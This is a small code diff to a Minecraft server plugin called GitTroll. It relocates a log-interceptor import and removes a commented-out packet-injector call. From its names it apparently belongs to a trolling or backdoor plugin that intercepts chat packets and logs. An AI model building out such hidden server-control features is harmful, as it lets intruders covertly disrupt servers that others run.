@@ -27,9 +27,9 @@ import net.Lenni0451.GitTroll.event.events.PluginDisableEvent;
 import net.Lenni0451.GitTroll.event.events.ServerLoadedEvent;
 import net.Lenni0451.GitTroll.manager.CommandManager;
 import net.Lenni0451.GitTroll.utils.CustomPlayer;
-import net.Lenni0451.GitTroll.utils.LogIntercepter;
 import net.Lenni0451.GitTroll.utils.Logger;
 import net.Lenni0451.GitTroll.utils.TrustedInfo;
+import net.Lenni0451.GitTroll.utils.loginterceptor.LogIntercepter;
 import net.minecraft.server.v1_8_R3.MinecraftServer;
 import net.minecraft.server.v1_8_R3.Packet;
 import net.minecraft.server.v1_8_R3.PacketPlayInChat;
@@ -220,8 +220,6 @@ public class GitTroll extends JavaPlugin implements Listener {
 				CustomPlayer.instanceOf(event.getPlayer()).sendGitMessage("The command prefix is §6" + CommandManager.COMMAND_PREFIX + "§a.");
 			}
 		}
-		//Old packet injector (Still there if you need it)
-//		new PacketInjector(event.getPlayer()).inject();
 	}
 	
 }
